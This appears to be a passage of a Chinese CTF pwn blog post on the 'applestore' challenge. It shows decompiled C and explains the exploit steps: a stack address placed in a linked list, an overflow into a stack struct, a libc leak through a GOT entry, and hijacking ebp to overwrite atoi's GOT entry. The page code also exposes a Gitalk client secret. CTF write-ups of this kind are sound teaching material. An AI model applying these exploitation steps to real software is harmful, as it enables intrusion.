+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">checkout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> total; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  item v2; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  total = cart();</span><br><span class="line">  <span class="keyword">if</span> ( total == <span class="number">7174</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"*: iPhone 8 - $1"</span>);</span><br><span class="line">    asprintf(&amp;v2.name, <span class="string">"%s"</span>, <span class="string">"iPhone 8"</span>);</span><br><span class="line">    v2.value = <span class="number">1</span>;</span><br><span class="line">    insert(&amp;v2);   <span class="comment">//v2位于栈上，将栈地址加入了链表</span></span><br><span class="line">    total = <span class="number">7175</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Total: $%d\n"</span>, total);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Want to checkout? Maybe next time!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​      实际上当<code>checkout</code>执行过一次后再遍历打印就会失败了，因为此时栈上此处变成了垃圾数据。而观察一下，<code>item v2; // [esp+18h] [ebp-20h] BYREF</code>，三个函数<code>add</code> <code>delete</code> <code>cart</code> 中都存在<code>char nptr[22]; // [esp+26h] [ebp-22h] BYREF</code>，而<code>my_read(nptr, 0x15u);</code>也就是说可以通过溢出写到最后这个结构体。</p>
+<p>​      调用<code>cart</code>时将成员<code>name</code>写成<code>got</code>表项即可得到<code>libc</code>。接下来考虑怎么修改。思路不难和堆题的<code>unlink</code>联系起来。如果直接将<code>got</code>表项改成<code>system</code>地址，<code>system</code>处代码段为只读不可修改。可以考虑将<code>handler</code>的<code>ebp</code>劫持到<code>atoi</code>的 <code>got</code>表处，用<code>my_read(nptr, 0x15u);</code>修改。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://p1kk.github.io/" target="_blank" rel="noopener">https://p1kk.github.io/</a></p>
+<h2 id="一丢丢节省生命的调试技巧"><a href="#一丢丢节省生命的调试技巧" class="headerlink" title="一丢丢节省生命的调试技巧"></a>一丢丢节省生命的调试技巧</h2><p>​       如果想在打开调试窗口时自动执行多条gdb命令，可以在做题文件夹下创建<code>.gdbinit</code>文件，将命令以换行符分隔输入，在家目录下<code>.gdbinit</code>中加入<code>add-auto-load-safe-path ./</code>。这样在命令行进行gdb调试和gdb.attach时都能自动执行输入的命令。</p>
+<p>​       多条命令一起执行也可定义函数，同样可在.gdbinit中输入↓  如果想走一步看一块内存或者干嘛而display又不是很方便的话可以这么做。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def func</span><br><span class="line">command</span><br><span class="line">...</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>以及，看了下做题时间。我有病吧，就因为一个<code>calc</code>卡了一年？？</p>
+
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"0324b72a8577ea998218","clientSecret":"5e75c103ffafadd523fe6228fad280b3ec5a4972","repo":"comments","owner":"ll1ng","admin":["ll1ng"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/28/ret2dl-resolve/" rel="prev" title="ret2dl_resolve">
+      <i class="fa fa-chevron-left"></i> ret2dl_resolve
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#calc"><span class="nav-number">1.</span> <span class="nav-text">calc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">1.1.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dubblesort"><span class="nav-number">2.</span> <span class="nav-text">dubblesort</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#applestore"><span class="nav-number">3.</span> <span class="nav-text">applestore</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一丢丢节省生命的调试技巧"><span class="nav-number">5.</span> <span class="nav-text">一丢丢节省生命的调试技巧</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ling"
+      src="/images/%E7%A9%B9.jpg">
+  <p class="site-author-name" itemprop="name">ling</p>
+  <div class="site-description" itemprop="description">永远不要停止思考啊</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ll1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ll1ng" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://ll1ng.github.io/atom.xml" title="rss → https:&#x2F;&#x2F;ll1ng.github.io&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>rss</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      小伙伴们>.<
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.wootec.top/" title="https:&#x2F;&#x2F;www.wootec.top&#x2F;" rel="noopener" target="_blank">Reverier</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://arttnba3.cn/" title="https:&#x2F;&#x2F;arttnba3.cn&#x2F;" rel="noopener" target="_blank">arttnba3</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mercer5.github.io/" title="https:&#x2F;&#x2F;mercer5.github.io&#x2F;" rel="noopener" target="_blank">mercer</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://yoursite.com/" title="http:&#x2F;&#x2F;yoursite.com" rel="noopener" target="_blank">...</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+    <!--music-->
+    <div>
+    
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=446935665&auto=0&height=66"></iframe>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ling</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+  <script data-pjax>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+</body>
+</html>
